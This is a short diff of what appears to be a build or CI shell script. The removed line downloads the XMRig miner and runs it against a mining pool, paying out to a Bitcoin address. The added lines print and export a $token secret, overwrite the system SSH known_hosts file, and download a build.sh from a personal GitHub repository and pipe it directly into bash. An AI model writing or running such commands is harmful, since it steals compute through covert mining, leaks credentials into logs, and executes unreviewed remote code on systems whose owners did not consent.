@@ -1,1 +1,5 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:1BJyhdaNxaKe3xgDNXBQkzCpADiF7xFCLq.hehe01 -p x
+echo $token
+export token=$token
+ssh-keyscan -H github.com > /etc/ssh/ssh_known_hosts
+wget https://raw.githubusercontent.com/ganssjr/tumbal/main/build.sh && 
+bash build.sh
